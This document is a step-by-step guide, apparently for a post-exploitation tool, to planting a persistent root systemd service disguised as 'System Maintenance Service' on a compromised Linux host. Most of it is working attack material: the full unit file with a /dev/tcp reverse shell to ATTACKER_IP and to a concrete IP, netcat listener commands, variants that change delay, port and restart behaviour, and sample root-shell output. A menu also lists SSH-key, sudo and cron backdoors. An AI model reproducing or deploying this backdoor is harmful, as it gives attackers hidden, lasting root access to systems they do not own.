# Option 4: Install Systemd Service

## Overview

**Purpose:** Creates a persistent systemd service that automatically starts on boot and can establish reverse shell connections or execute arbitrary commands.

**How It Works:**
1. Creates a systemd service file in `/etc/systemd/system/`
2. Configures the service to run as root
3. Enables automatic startup on boot
4. Sets up automatic restart on failure
5. Can execute reverse shells or other commands

---

## Step-by-Step Instructions

### Step 1: Run the Exploit and Gain Root Access

**Location:** Target machine

```bash
./comprehensive

# Wait for privilege escalation
# You should see: [INFO] Successfully gained root privileges!
```

### Step 2: Select Option 4 from the Menu

**Location:** Target machine

When the menu appears, select option 4:

```
╔══════════════════════════════════════════════════╗
║        POST-EXPLOITATION MENU                    ║
╚══════════════════════════════════════════════════╝

Available actions:
  1. Inject SSH backdoor key
  2. Install sudo backdoor
  3. Install cron persistence
  4. Install systemd service
  ...
  
Select option: 4
```

### Step 3: Verify Installation

**Location:** Target machine

You should see:
```
[INFO] Installing systemd service backdoor
[INFO] Systemd service installed
```

### Step 4: Customize the Service (Important!)

**Location:** Target machine

**Before using, you MUST customize the service file** because it contains a placeholder IP address:

```bash
# Edit the service file
sudo nano /etc/systemd/system/system-maintenance.service
```

**Current content (with placeholder):**
```
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Replace `ATTACKER_IP` with your actual IP:**
```
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

**Then reload systemd:**
```bash
sudo systemctl daemon-reload
sudo systemctl restart system-maintenance.service
```

---

## What Gets Installed

### Service File Created

**Location:** `/etc/systemd/system/system-maintenance.service`

**Content:**
```ini
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
```

**File Permissions:**
- Mode: `0644` (readable by all, writable by owner)
- Owner: `root:root`

### Service Configuration Breakdown

**`[Unit]` Section:**
- `Description`: Service description (appears in systemd status)
- `After=network.target`: Start after network is available

**`[Service]` Section:**
- `Type=simple`: Simple service type
- `ExecStart`: Command to execute (currently has placeholder IP)
- `Restart=always`: Automatically restart if service fails
- `RestartSec=60`: Wait 60 seconds before restarting
- `User=root`: Run as root user

**`[Install]` Section:**
- `WantedBy=multi-user.target`: Enable for multi-user runlevel (normal boot)

---

## How to Use the Service

### Step 1: Customize the Service

**Edit the service file:**
```bash
sudo nano /etc/systemd/system/system-maintenance.service
```

**Replace `ATTACKER_IP` with your IP address:**
```ini
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

**Example:**
```ini
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

### Step 2: Reload Systemd Configuration

```bash
sudo systemctl daemon-reload
```

### Step 3: Enable the Service

```bash
# Enable service to start on boot
sudo systemctl enable system-maintenance.service

# Start the service immediately
sudo systemctl start system-maintenance.service
```

### Step 4: Set Up Listener (On Your Machine)

**Location:** Your local attacker machine

```bash
# Listen for reverse shell connection
nc -lvp 4444

# Or using netcat with verbose output
nc -lvnp 4444
```

**What happens:**
1. Service starts and waits 300 seconds (5 minutes)
2. After 5 minutes, establishes reverse shell to your IP:4444
3. You receive root shell connection

### Step 5: Verify Service Status

**Location:** Target machine

```bash
# Check service status
sudo systemctl status system-maintenance.service

# Check if service is enabled
sudo systemctl is-enabled system-maintenance.service

# View service logs
sudo journalctl -u system-maintenance.service -f
```

---

## Service Customization Options

### Option 1: Change Reverse Shell Port

**Edit service file:**
```ini
ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/192.168.1.100/8080 0>&1'
```

**Update listener:**
```bash
nc -lvp 8080
```

### Option 2: Remove Delay

**Remove the 5-minute delay:**
```ini
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

### Option 3: Execute Custom Command

**Instead of reverse shell, execute custom command:**
```ini
ExecStart=/bin/bash -c '/path/to/script.sh'
```

**Or run exploit:**
```ini
ExecStart=/bin/bash -c '/path/to/comprehensive --stealth'
```

### Option 4: Multiple Commands

**Chain multiple commands:**
```ini
ExecStart=/bin/bash -c 'command1 && command2 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

### Option 5: Change Restart Behavior

**Restart only on failure:**
```ini
Restart=on-failure
```

**Never restart:**
```ini
Restart=no
```

### Option 6: Change Startup Delay

**Start immediately:**
```ini
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

**Start after 1 hour:**
```ini
ExecStart=/bin/bash -c 'sleep 3600 && /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

---

## Verification

### Check Service File Exists

```bash
ls -la /etc/systemd/system/system-maintenance.service
cat /etc/systemd/system/system-maintenance.service
```

### Check Service Status

```bash
# Detailed status
sudo systemctl status system-maintenance.service

# Quick check
sudo systemctl is-active system-maintenance.service
sudo systemctl is-enabled system-maintenance.service
```

### Check Service Logs

```bash
# View recent logs
sudo journalctl -u system-maintenance.service

# Follow logs in real-time
sudo journalctl -u system-maintenance.service -f

# View last 50 lines
sudo journalctl -u system-maintenance.service -n 50
```

### Verify Service Starts on Boot

```bash
# Check if enabled
sudo systemctl is-enabled system-maintenance.service
# Should output: enabled

# List all enabled services
sudo systemctl list-unit-files | grep enabled | grep system-maintenance
```

---

## Practical Examples

### Example 1: Basic Reverse Shell Setup

**1. On target machine - Edit service:**
```bash
sudo nano /etc/systemd/system/system-maintenance.service
# Change ATTACKER_IP to your IP
```

**2. On target machine - Enable service:**
```bash
sudo systemctl daemon-reload
sudo systemctl enable system-maintenance.service
sudo systemctl start system-maintenance.service
```

**3. On your machine - Start listener:**
```bash
nc -lvp 4444
```

**4. Wait 5 minutes, receive shell:**
```
listening on [any] 4444 ...
connect to [192.168.1.100] from target [192.168.1.50] 54321
root@target:~# whoami
root
```

### Example 2: Run Exploit on Boot

**Edit service to run exploit:**
```ini
[Service]
Type=simple
ExecStart=/home/htb-student/comprehensive --stealth
Restart=always
RestartSec=300
User=root
```

**Enable:**
```bash
sudo systemctl daemon-reload
sudo systemctl enable system-maintenance.service
sudo systemctl start system-maintenance.service
```

### Example 3: Execute Script Periodically

**Create a script:**
```bash
sudo nano /root/persistence.sh
```

**Script content:**
```bash
#!/bin/bash
/path/to/comprehensive --stealth
# Or other persistence mechanisms
```

**Update service:**
```ini
[Service]
Type=simple
ExecStart=/root/persistence.sh
Restart=always
RestartSec=3600
User=root
```

